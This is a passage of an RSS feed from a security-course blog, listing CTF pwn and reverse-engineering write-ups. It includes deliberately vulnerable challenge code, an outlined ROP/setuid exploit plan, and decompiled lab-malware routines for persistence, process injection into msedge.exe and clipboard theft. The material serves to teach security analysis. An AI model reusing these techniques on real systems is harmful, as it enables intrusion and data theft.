HW - Notepad-Stage 3) Source code 呈上上題
Recon 這一題沒時間解出來，所以僅僅做個紀錄，包含和各位大老討論的結果以及流程
首先，後端有一個洞，就是在login的write，他的buf仔細和其他有call到write做對比會發現，他並沒有清掉buf的內容，這代表他會完完整整的把裡面的內容送到前端，但為甚麼前面兩題都沒有這個問題呢?因為前端並沒有把buf的內容印出來，所以首要目標是找到一個方法可以leak出內容的shellcode之類的，這樣我們就可以抓到text / libc base address 知道這些事情可以幹嘛呢?check token有一個bof的洞，我們可以利用這個洞來傳送rop，所以需要ret2libc抓到base address之後在蓋rop ROP具體的內容是甚麼呢?有兩種方法可以拿到flag，一個是拿到shell之後setuid(0)，因為backend 有 suid 權限，所以我們才可以用 setuid(0) 以root 執行，然後cat /flag_root；第二種是直接ORW，看flag是啥這樣</description></item><item><title>Simple PWN 0x37(2023 HW - HACHAMA)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x372023-hw---hachama/index.html</guid><description>Simple PWN 0x37(2023 HW - HACHAMA) Background stack pivot rop bof
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include "SECCOMP.h" long n; char msg[0x20]; long n2; struct sock_filter seccompfilter[]={ BPF_STMT(BPF_LD | BPF_W | BPF_ABS, ArchField), BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), BPF_STMT(BPF_LD | BPF_W | BPF_ABS, SyscallNum), Allow(open), Allow(openat), Allow(read), Allow(write), Allow(close), Allow(readlink), Allow(getdents), Allow(getrandom), Allow(brk), Allow(rt_sigreturn), Allow(exit), Allow(exit_group), BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL), }; struct sock_fprog filterprog={ .len=sizeof(seccompfilter)/sizeof(struct sock_filter), .filter=seccompfilter }; void apply_seccomp(){ if(prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0)){ perror("Seccomp Error"); exit(1); } if(prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;filterprog)==-1){ perror("Seccomp Error"); exit(1); } return; } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); apply_seccomp(); char buf2[0x30]; // long n2 = 0x30; // char msg[0x20]; char name[0x20]; // long n = 20; n2 = 0x30; n = 20; printf("Haaton's name? "); n = read(0, name, n); name[n] = 0; strcpy(msg, name); strcat(msg, " hachamachama"); puts(msg); puts("ECHO HACHAMA!"); while (1) { read(0, buf2, n2); if (strcmp(buf2, "HACHAMA") == 0) write(1, buf2, n2); else break; } return 0; } :::</description></item><item><title>Simple PWN 0x38(Lab - UAF)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/index.html</guid><description>Simple PWN 0x38(Lab - UAF) Background Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> void default_handle(char *event) { printf("EVENT: get event named \"%s\"!\n", event); } struct entity { char *name; char *event; void (*event_handle)(char *); }; struct entity *entities[0x10]; int read_int() { char buf[0x20]; read(0, buf, 0x1f); return atoi(buf); } int get_idx() { int idx = read_int(); if (idx >= 0x10 || idx &lt; 0) exit(0); return idx; } void memu() { puts("1. register entity"); puts("2. delete entity"); puts("3. set name"); puts("4. trigger event"); printf("choice: "); } void register_entity() { int idx; printf("Index: "); idx = get_idx(); entities[idx] = malloc(sizeof(struct entity)); entities[idx]->event_handle = default_handle; entities[idx]->event = "Default Event"; } void delete_entity() { int idx; printf("Index: "); idx = get_idx(); if (entities[idx]) { free(entities[idx]->name); free(entities[idx]); } else puts("Invalid index"); } void set_name() { int idx; int len; printf("Index: "); idx = get_idx(); if (entities[idx]) { printf("Nmae Length: "); len = read_int(); if (len == 0) exit(0); entities[idx]->name = malloc(len); printf("Name: "); read(0, entities[idx]->name, len - 1); } else puts("Invalid index"); } void trigger_event() { int idx; printf("Index: "); idx = get_idx(); if (entities[idx]) { printf("Name: %s\n", entities[idx]->name); entities[idx]->event_handle(entities[idx]->event); } } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); printf("gift1: %p\n", &amp;system); void *ptr = malloc(0x10); printf("gift2: %p\n", ptr); for (;;) { memu(); int choice = read_int(); switch (choice) { case 1: register_entity(); break; case 2: delete_entity(); break; case 3: set_name(); break; case 4: trigger_event(); default: puts("Invalid command"); } } return 0; } :::</description></item><item><title>Simple PWN 0x39(Lab - Double Free)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/index.html</guid><description>Simple PWN 0x39(Lab - Double Free) Background 0x18(Lab - babynote)
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;fcntl.h> struct note { char *content; unsigned long len; }; struct note notes[0x10]; int read_int() { char buf[0x20]; read(0, buf, 0x1f); return atoi(buf); } unsigned long read_ul() { char buf[0x20]; read(0, buf, 0x1f); return strtoul(buf, NULL, 10); } int get_idx() { int idx = read_int(); if (idx >= 0x10 || idx &lt; 1) exit(0); return idx; } void add_note() { int idx; printf("Index: "); idx = get_idx(); printf("Length: "); notes[idx].len = read_ul(); notes[idx].content = malloc(notes[idx].len); puts("Add done"); } void read_note() { int idx; printf("Index: "); idx = get_idx(); printf("Note[%d]:\n", idx); write(1, notes[idx].content, notes[idx].len); } void write_note() { int idx; printf("Index: "); idx = get_idx(); printf("Content: "); read(0, notes[idx].content, notes[idx].len); } void delete_note() { int idx; printf("Index: "); idx = get_idx(); free(notes[idx].content); puts("Delete done"); } void memu() { puts("1. add note"); puts("2. read note"); puts("3. write note"); puts("4. delete note"); printf("choice: "); } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); int fd = open("./flag.txt", O_RDONLY); notes[0].len = 0x30; notes[0].content = malloc(0x30); read(fd, notes[0].content, 0x30); close(fd); for (;;) { memu(); int choice = read_int(); switch (choice) { case 1: add_note(); break; case 2: read_note(); break; case 3: write_note(); break; case 4: delete_note(); break; default: puts("Invalid command"); } } return 0; } :::</description></item><item><title>Simple PWN 0x40(2023 HW - UAF++)</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/index.html</guid><description>Simple PWN 0x40(2023 HW - UAF++) Background 0x34(2023 Lab - UAF):three:
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> void default_handle(char *event) { printf("EVENT: get event named \"%s\"!\n", event); } struct entity { char *name; char *event; void (*event_handle)(char *); }; struct entity *entities[0x2]; int read_int() { char buf[0x20]; read(0, buf, 0x1f); return atoi(buf); } int get_idx() { int idx = read_int(); if (idx >= 0x2 || idx &lt; 0) exit(0); return idx; } void memu() { puts("1. register entity"); puts("2. delete entity"); puts("3. trigger event"); printf("choice: "); } void register_entity() { int idx; int len; printf("Index: "); idx = get_idx(); entities[idx] = malloc(sizeof(struct entity)); entities[idx]->event = "Default Event"; entities[idx]->event_handle = default_handle; printf("Nmae Length: "); len = read_int(); if (len == 0 || len > 0x430) exit(0); entities[idx]->name = malloc(len); printf("Name: "); read(0, entities[idx]->name, len - 1); } void delete_entity() { int idx; printf("Index: "); idx = get_idx(); if (entities[idx]) { free(entities[idx]->name); free(entities[idx]); } else puts("Invalid index"); } void trigger_event() { int idx; printf("Index: "); idx = get_idx(); if (entities[idx]) { printf("Name: %s\n", entities[idx]->name); entities[idx]->event_handle(entities[idx]->event); } } int main(void) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); for (;;) { memu(); int choice = read_int(); switch (choice) { case 1: register_entity(); break; case 2: delete_entity(); break; case 3: trigger_event(); default: puts("Invalid command"); } } return 0; } :::</description></item><item><title>Simple Reverse - 0x01(Lab - Sacred Arts)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/index.html</guid><description>Simple Reverse - 0x01(Lab - Sacred Arts) Background X86組合語言/基本指令集 neg (Negate) instruction 實作：先在執行neg rax之前把$rax設定成2，執行指令之後剛好是2的補數 gef➤ set $rax=2 gef➤ info r $rax rax 0x2 0x2 gef➤ ni 0x00000000004010e0 in ?? () gef➤ info r $rax rax 0xfffffffffffffffe 0xfffffffffffffffe X86組合語言/基本指令集/IA32指令:xchg 實作：執行xchg ah, al之前先看一下$rax的狀態 gef➤ info r $rax rax 0xfffffffffffffffe 0xfffffffffffffffe gef➤ ni 0x00000000004010e2 in ?? () gef➤ info r $rax rax 0xfffffffffffffeff 0xfffffffffffffeff Source Code :::spoiler IDA Pro Disassembler Code</description></item><item><title>Simple Reverse - 0x03(Lab - Why)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/index.html</guid><description>Simple Reverse - 0x03(Lab - Why) Background What is function pointer? Lecture Vid. Source Code :::spoiler IDA main function
int __cdecl main(int argc, const char **argv, const char **envp) { int i; // [rsp+Ch] [rbp-4h] printf("Give me flag: "); __isoc99_scanf("%25s", buf); for ( i = 0; i &lt;= 24; ++i ) { if ( buf[i] - 10 != enc_flag[i] ) return 0; } pass = 1; return 0; } :::</description></item><item><title>Simple Reverse - 0x14(2023 Lab - AssemblyDev)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x142023-lab---assemblydev/index.html</guid><description>Simple Reverse - 0x14(2023 Lab - AssemblyDev) Background Tools Assembly x86 Emulator Compiler Explorer
Source code :::spoiler arithmatic.py
#!/usr/bin/python from module.checker import * from module.math import * from sys import argv challenge_info = f''' let a = MEM[RSP+0x0:RSP+0x4] let b = MEM[RSP+0x4:RSP+0x8] let c = MEM[RSP+0x8:RSP+0xc] EAX = a + b EBX = a - b ECX = -c EDX = 9*a + 7 ''' a = get_rand(4) b = get_rand(4) c = get_rand(4) init_list = [ (RSP_DEFAULT + 0x0, a, 4), (RSP_DEFAULT + 0x4, b, 4), (RSP_DEFAULT + 0x8, c, 4), ] ans_list = [ ("eax", add(a, b, 4)), ("ebx", sub(a, b, 4)), ("ecx", neg(c, 4)), ("edx", add(mul(a, 9, 4), 7, 4)), ] if __name__ == "__main__": if len(argv) &lt; 2: print(f"{C.BLUE}[+]{C.NC} Usage: python3 {__file__} &lt;path_to_asm_file>") print(challenge_info) exit(0) code = open(argv[1], 'r').read() Checker(init_list, ans_list, code) ::: :::spoiler data_movement.py</description></item><item><title>Simple Reverse - 0x15(2023 HW - crackme_vectorization)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x152023-hw---crackme_vectorization/index.html</guid><description>Simple Reverse - 0x15(2023 HW - crackme_vectorization) Source Code :::spoiler IDA Main Function
__int64 __fastcall main(int a1, char **a2, char **a3) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND] __isoc99_scanf("%d", &amp;user_input_len); // 長度為49 user_input_len_cp = user_input_len; sqrt_length = sqrt((double)user_input_len); // 開根號後是7 sqrt_length_cp = (int)sqrt_length; if ( sqrt_length > (double)(int)sqrt_length ) ++sqrt_length_cp; sqrt_len = _mm_shuffle_epi32(_mm_cvtsi32_si128(sqrt_length_cp), 224).m128i_u64[0];// 原本的shuffle num就是user input length的開根號結果 space = (struc_1 *)malloc(0x10uLL); space->sqrt_len = sqrt_len; size = 4 * sqrt_length_cp * (__int64)sqrt_length_cp;// size是196 shuffle_space = malloc(size); space->content_space = (__int64)shuffle_space; if ( user_input_len_cp > 0 ) { shuffle_space_cp = shuffle_space; len = 0LL; do { __isoc99_scanf("%d", content); shuffle_space_cp[len++] = content[0]; } while ( user_input_len > (int)len ); // 要輸入東西49次 } if ( length == sqrt_length_cp &amp;&amp; (space_1 = (struc_1 *)malloc(0x10uLL), space_1->sqrt_len = sqrt_len, shuffle_space_1 = malloc(size), src = cipher_flag, space_1->content_space = (__int64)shuffle_space_1, memcpy(shuffle_space_1, src, size), result = ugly_matrix_multiplication( (int *)space_1, (__int64)space), // guess_cipher的大小是196 // 他會把我們輸入的東西和他原本的東西一起送到guess_encrypt的這個function中 !memcmp((const void *)result[1], verify_key, size)) ) { puts("Correct!"); } else { puts(":("); } return 0LL; } ::: :::spoiler IDA Ugly Function</description></item><item><title>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/index.html</guid><description>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80) Description 分析 eductf-lab.exe 中的 function sub_140001C80 在做什麼，並找出其行為所對應的 MITRE ATT&amp;CK technique ID。 Flag format: FLAG{T1234.001}
Background GetModuleFileNameA GetUserNameA CopyFileA SetFileAttributesA Source code Main Function int __cdecl main(int argc, const char **argv, const char **envp) { Sleep(0x1B7740u); sub_140001C80(); sub_140001030(); sub_140001120(); sub_140001BF0(); return 0; } sub_140001C80 :::spoiler IDA Source Code DWORD sub_140001C80() { DWORD result; // eax size_t v1; // rax DWORD v2; // [rsp+20h] [rbp-258h] const CHAR *lpNewFileName; // [rsp+28h] [rbp-250h] DWORD pcbBuffer[4]; // [rsp+30h] [rbp-248h] BYREF CHAR Buffer[272]; // [rsp+40h] [rbp-238h] BYREF CHAR Filename[272]; // [rsp+150h] [rbp-128h] BYREF result = GetModuleFileNameA(0i64, Filename, 0x104u); v2 = result; if ( result ) { result = GetUserNameA(Buffer, pcbBuffer); if ( result ) { v1 = pcbBuffer[0] + v2 + 100; if ( __CFADD__(pcbBuffer[0], v2 + 100) ) v1 = -1i64; lpNewFileName = (const CHAR *)malloc(v1); sub_140001350( lpNewFileName, v2 + pcbBuffer[0] + 100, "C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityUpdateCheck.exe", Buffer); result = CopyFileA(Filename, lpNewFileName, 0); if ( result ) return SetFileAttributesA(lpNewFileName, 0x26u); } } return result; } ::: Recon :::spoiler IDA sub_14001C80(解析版)</description></item><item><title>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/index.html</guid><description>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030) Description 分析 eductf-lab.exe 中的 function sub_140001030 在做什麼，並找出其行為所對應的 MITRE ATT&amp;CK technique ID。 Flag format: FLAG{T1234}
Background SystemTimeToFileTime CreateWaitableTimerW SetWaitableTimer WaitForSingleObject Source code sub_140001030 :::spoiler IDA Source Code int waitUntil20231118() { HANDLE Result; // rax HANDLE hTimer; // [rsp+30h] [rbp-38h] SYSTEMTIME SystemTime; // [rsp+38h] [rbp-30h] BYREF struct _FILETIME FileTime; // [rsp+48h] [rbp-20h] BYREF LARGE_INTEGER DueTime; // [rsp+50h] [rbp-18h] BYREF SystemTime.wYear = 2023; SystemTime.wMonth = 11; SystemTime.wDay = 18; SystemTime.wDayOfWeek = 6; SystemTime.wHour = 0; SystemTime.wMinute = 0; SystemTime.wSecond = 0; SystemTime.wMilliseconds = 0; LODWORD(Result) = SystemTimeToFileTime(&amp;SystemTime, &amp;FileTime); if ( Result ) { DueTime = FileTime; Result = CreateWaitableTimerW(0i64, 0, 0i64); hTimer = Result; if ( Result ) { LODWORD(Result) = SetWaitableTimer(Result, &amp;DueTime, 0, 0i64, 0i64, 0); if ( Result ) LODWORD(Result) = WaitForSingleObject(hTimer, 0xFFFFFFFF); } } return Result; } ::: Recon 攻擊者的完整意圖</description></item><item><title>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/index.html</guid><description>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120) Description 分析 eductf-lab.exe 中的 function sub_140001120 在做什麼，並找出其所建立的 Mutex 的名稱。 Flag format: FLAG{mutex_name}
Background CreateMutexA GetLastError 使用 Mutex 物件 可以使用 mutex 物件 來保護共用資源，避免多個執行緒或進程同時存取。 每個執行緒都必須等候 mutex 的擁有權，才能執行可存取共用資源的程式碼。 例如，如果數個執行緒共用資料庫的存取權，執行緒可以使用 mutex 物件一次只允許一個執行緒寫入資料庫。
系統錯誤碼 (0-499) ERROR_ALREADY_EXISTS 183 (0xB7) 無法建立檔案，該檔案已存在。
Source code sub_140001120 :::spoiler IDA Source Code int sub_140001120() { HANDLE MutexA; // rax int i; // [rsp+20h] [rbp-78h] int v3[2]; // [rsp+30h] [rbp-68h] CHAR Name[32]; // [rsp+38h] [rbp-60h] BYREF char v5[32]; // [rsp+58h] [rbp-40h] BYREF v3[0] = 1684234874; qmemcpy(v5, &amp;unk_140003348, 0x1Dui64); for ( i = 0; i &lt; 28; ++i ) Name[i] = *(v3 + i % 4) ^ v5[i]; MutexA = CreateMutexA(0i64, 1, Name); if ( MutexA ) { LODWORD(MutexA) = GetLastError(); if ( MutexA == 183 ) exit(0); } return MutexA; } ::: Recon 這一題有個小地方要注意，雖然觀察過source code是非常簡單的建立mutex的操作，題目想要知道的mutex name也非常簡單，只是個xor就知道的東西，不過在實作上需要注意endian的問題，一開始我是直接按照0x64, 0x63, 0x62, 0x7A的順序，但結果輸出一些ascii的字元，其實他是從後面讀進來再開始操作xor</description></item><item><title>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/index.html</guid><description>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload) Description 取出 eductf-lab.exe 中的 next stage payload (embedded PE file)，並計算其 MD5 hash。 Flag format: FLAG{462fe0000…} (hex character must be lowercase)
Background DOS Header NT Headers - Optional Header Source code sub_140001870 :::spoiler IDA Source Code解析前 __int64 __fastcall sub_140001870(char **pe_file, _QWORD *pe_file_size) { *pe_file = byte_140005040; *pe_file_size = 72770i64; // 這是個是怎麼判斷成PE size我也不知道 if ( **pe_file == 'ZM' ) { if ( *(sub_1400013D0(*pe_file) + 0x18) == 0x20B ) { return 1i64; } else { sub_140001260("remote dll optional header magic check failed\n"); return 0i64; } } else { sub_140001260("remote dll magic check failed\n"); return 0i64; } } ::: Recon 進到sub_140001BF0之後可以先觀察sub_140001870，前面有source code可以看到他正在比對byte_140005040的前面兩個字元是不是等於MZ，也就是一支PE file的magic header，並且又比對了後面0x18的位置是不是等於0x20B，也就是另外一個magic header(用來判斷該程式是否可於64-bits運行)，由以上操作幾乎可以確定駭客把真正的程式(可能是惡意的)塞在正常的PE file中 :::info 如果只是要解題的話，到這邊就可以了，只要利用前一題學到的把byte_140005040改變他的type，變成char[72770]，再用Shift+E，把raw data export出來，丟到online md5 checksum，就可以得到這支檔案的hash(462fe0007f86957f59824e113f78947c) ::: sub_1400013D0仔細看他的操作，其實就是把byte_140005040的地址，加上0x3C，再取值，就是e_lfanew，也就是NT Headers的file offset，這個offset加上原本的原本的140005040就是NT header，所以可以把sub_1400013D0 rename成getNtHdr __int64 __fastcall getNtHdr(__int64 a1) { return *(a1 + 0x3C) + a1; } 接下來可以改變這個function的type，按Y，改IMAGE_NT_HEADERS *__fastcall getNtHdr(_QWORD)，就變得非常簡潔好看，另外，要把pe_file的type從_int64改成_QWORD的原因是pe_file存的是byte_140005040的地址，不是數字，雖然代表的byte數一樣，但意義不相同，所以IDA可能會解析不出來 最後就把目前的這個sub function rename成getEmbeddedPE_File就可以了 :::info ::: :::spoiler 解析後</description></item><item><title>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x202023-lab---winmalware---extract-next-stage-payload---2/index.html</guid><description>Simple Reverse - 0x20(2023 Lab - WinMalware - Extract Next Stage Payload - 2) Background CreateToolhelp32Snapshot Process32FirstW GetCurrentProcess OpenProcess EqualSid Process32NextW OpenProcessToken GetTokenInformation Source code sub_1400016B0 :::spoiler IDA Source Code解析前 __int64 returnTargetPid() { DWORD LastError; // eax DWORD v2; // eax WCHAR *szExeFile; // rax signed __int64 v4; // rcx WCHAR v5; // dx int v6; // eax DWORD th32ProcessID; // [rsp+20h] [rbp-288h] HANDLE hSnapshot; // [rsp+28h] [rbp-280h] HANDLE hObject; // [rsp+30h] [rbp-278h] HANDLE CurrentProcess; // [rsp+38h] [rbp-270h] PSID pSid1; // [rsp+40h] [rbp-268h] BYREF PSID pSid2; // [rsp+48h] [rbp-260h] BYREF PROCESSENTRY32W pe; // [rsp+50h] [rbp-258h] BYREF hSnapshot = CreateToolhelp32Snapshot(2u, 0); if ( hSnapshot == (HANDLE)-1i64 ) { LastError = GetLastError(); sub_140001260("CreateToolhelp32Snapshot failed with error %lu\n", LastError); return 0i64; } else { pe.dwSize = 568; if ( Process32FirstW(hSnapshot, &amp;pe) ) { pSid2 = malloc(0x44ui64); CurrentProcess = GetCurrentProcess(); sub_140001500(CurrentProcess, &amp;pSid2); th32ProcessID = 0; do { pSid1 = malloc(0x44ui64); hObject = OpenProcess(0x400u, 0, pe.th32ProcessID); if ( hObject ) { if ( (unsigned int)sub_140001500(hObject, &amp;pSid1) ) { if ( EqualSid(pSid1, pSid2) ) { szExeFile = pe.szExeFile; v4 = (char *)L"msedge.exe" - (char *)pe.szExeFile; while ( 1 ) { v5 = *szExeFile; if ( *szExeFile != *(WCHAR *)((char *)szExeFile + v4) ) break; ++szExeFile; if ( !v5 ) { v6 = 0; goto LABEL_14; } } v6 = v5 &lt; *(WCHAR *)((char *)szExeFile + v4) ? -1 : 1; LABEL_14: if ( !v6 ) th32ProcessID = pe.th32ProcessID; } free(pSid1); } CloseHandle(hObject); } } while ( !th32ProcessID &amp;&amp; Process32NextW(hSnapshot, &amp;pe) ); free(pSid2); CloseHandle(hSnapshot); return th32ProcessID; } else { v2 = GetLastError(); sub_140001260("Process32First failed with error %lu\n", v2); CloseHandle(hSnapshot); return 0i64; } } } ::: Recon 首先，他先利用CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)把當前系統中所有的process都snapshot，並回傳指定快照集的開啟控制碼(handle)</description></item><item><title>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x212023-lab---winmalware---extract-next-stage-payload---3/index.html</guid><description>Simple Reverse - 0x21(2023 Lab - WinMalware - Extract Next Stage Payload - 3) Background VirtualAllocEx 記憶體保護常數 WriteProcessMemory CreateRemoteThread Export Address Table(EAT) Source code :::spoiler Source Code sub_140001A60
__int64 __fastcall sub_140001A60(DWORD edge_pid, const void *pe_file, SIZE_T pe_file_size) { DWORD v4; // eax DWORD LastError; // eax HANDLE hProcess; // [rsp+40h] [rbp-38h] char *lpBaseAddress; // [rsp+48h] [rbp-30h] LPTHREAD_START_ROUTINE lpStartAddress; // [rsp+50h] [rbp-28h] __int64 v9; // [rsp+58h] [rbp-20h] BYREF DWORD ThreadId; // [rsp+60h] [rbp-18h] BYREF v9 = 0i64; sub_1400018F0(pe_file, &amp;v9); if ( v9 ) { hProcess = OpenProcess(0x43Au, 0, edge_pid); if ( hProcess ) { lpBaseAddress = (char *)VirtualAllocEx(hProcess, 0i64, pe_file_size, 0x3000u, 0x40u); if ( WriteProcessMemory(hProcess, lpBaseAddress, pe_file, pe_file_size, 0i64) ) { lpStartAddress = (LPTHREAD_START_ROUTINE)&amp;lpBaseAddress[v9]; CreateRemoteThread(hProcess, 0i64, 0i64, (LPTHREAD_START_ROUTINE)&amp;lpBaseAddress[v9], 0i64, 0, &amp;ThreadId); sub_140001260("remote thread id: %lu, loader address: %p", ThreadId, lpStartAddress); return 1i64; } else { LastError = GetLastError(); sub_140001260("WriteProcessMemory failed, %lu", LastError); return 0i64; } } else { v4 = GetLastError(); sub_140001260("OpenProcess failed, %lu", v4); return 0i64; } } else { sub_140001260("get_reflectivce_loader_offset failed\n"); return 0i64; } } :::</description></item><item><title>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x222023-lab---winmalware---collect/index.html</guid><description>Simple Reverse - 0x22(2023 Lab - WinMalware - Collect) Background 如果想要分析DLL，可以從以下三個地方切入
_DllMainCRTStartup (DLL 載入和移除時的初始化與收尾) DllMain / DllEntryPoint / CRT_INIT (function signature 相同) 找有三個參數的 function call 範例就大概像這樣，從_DllMainCRTStartup底下有call _CRT_INIT和call DllEntryPoint(DllMain在比較下面) Exported Functions TLS Callback OpenClipboard GetClipboardData globalLock _itoa Source Code IDA解析的source code很常會出現明明沒有return value但還是自動建立的狀況，所以適時的刪除return value(Shift+DEL)是對分析比較好的做法
DllMain BOOL __stdcall DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) { if ( fdwReason == 1 ) { MessageBoxA(0i64, "Reflective Dll Injection success. Remember to delete the persistence file", "eductf-lab", 0); my_main(); // 不重要的東西 collect_and_exfiltrate(); } return 1; } collect_and_exfiltrate void collect_and_exfiltrate(void) { PUCHAR pbInput; // [rsp+28h] [rbp-10h] BYREF pbInput = 0i64; collect_data(&amp;pbInput); exfiltrate(pbInput); } collect_data void __fastcall collect_data(char **pbInput) { char *pbInput_1; // [rsp+28h] [rbp-10h] BYREF collect_get_clipboard_data(&amp;pbInput_1); *pbInput = pbInput_1; } collect_get_clipboard_data void __fastcall collect_get_clipboard_data(LPVOID *pbInput) { HANDLE ClipboardData; // rax void *v3; // rsi int LastError; // eax char Buffer[34]; // [rsp+26h] [rbp-22h] BYREF if ( OpenClipboard(0i64) ) { ClipboardData = GetClipboardData(1u); v3 = ClipboardData; if ( ClipboardData ) { *pbInput = GlobalLock(ClipboardData); GlobalUnlock(v3); } else { LastError = GetLastError(); _itoa(LastError, Buffer, 10); } } CloseClipboard(); } Recon 目前要分析的重點著重在DllMain中，所以其他的切入點可以先不管，並且先聚焦在collect data身上。其實作者一開始就有把debug information都放在這邊，所以分析可以更順暢</description></item><item><title>Simple Reverse - 0x23(2023 Lab - WinMalware - Exfiltrate)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x232023-lab---winmalware---exfiltrate/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 